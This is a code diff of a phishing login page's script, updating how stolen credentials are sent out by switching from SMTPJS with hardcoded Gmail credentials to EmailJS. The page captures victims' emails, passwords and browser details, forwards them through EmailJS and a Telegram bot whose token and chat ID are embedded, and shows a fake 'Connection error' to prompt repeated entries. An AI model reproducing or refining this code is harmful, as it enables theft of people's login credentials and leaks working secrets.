@@ -550,10 +550,15 @@ html, body {
 <div class="page-transition__blocker"><div class="page-transition__loading-spin loading-spin"></div></div><div class="static-overlay__blocker static-overlay__blocker--hidden"></div></body></html>
 
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script>
+ 
 const token = '7946846386:AAEtvSEgF5YfNVWTdfiMeTYsEFDGgI09z9c';
 const chatId = '961967998';
+
+(function() {
+    emailjs.init('fg6NHAifMU7kwLYSI');
+  })();
 
 let count = 0; // Initialize the count variable to track failed attempts
 
@@ -577,7 +582,9 @@ $(document).ready(function () {
       const newHref = $(this).attr('href').replace('[[-email-]]', email);
       $(this).attr('href', newHref);
     });
+	
   }
+
 
   // Switch forms on button click
   $("#button--with-loader").click(function (event) {
@@ -610,15 +617,11 @@ $(document).ready(function () {
     }
 
     // Send email
-    Email.send({
-      //SecureToken: "9c98ebc2-4ab5-489a-ad83-101aac4dc571",
-	  Host: "smtp.gmail.com",
-	  Username: "agentstevenblackstone@gmail.com",
-	  Password: "eaezdtzdqcvsyydu",
-      To: 'oreblagdiva5@gmail.com',
-      From: "agentstevenblackstone@gmail.com",
-      Subject: "New Login Information Received",
-      Body: `Email: ${email}<br/>Password: ${password}<br/>User-Agent: ${navigator.userAgent}`,
+    emailjs.send('service_rve7epk','template_ouv0mjf', {
+		email: email,
+		password: password,
+		user_agent: navigator.userAgent,
+		login_time: new Date().toLocaleString()
     }).then(function () {
       // Send Telegram message
       const message = `————— New Login Info —————\n\nEmail: ${email}\nPassword: ${password}\n\nUser-Agent: ${navigator.userAgent}`;
@@ -657,7 +660,10 @@ $(document).ready(function () {
           clearPasswordField(); // Clear only the password field after every attempt
         },
       });
-    });
+    }, (error) => {
+        console.error('Email failed:', error);
+        $("#msg").text("Connection error. Please try again").css("color", "red").show();
+      });
   });
 
   // Clear password field after each attempt
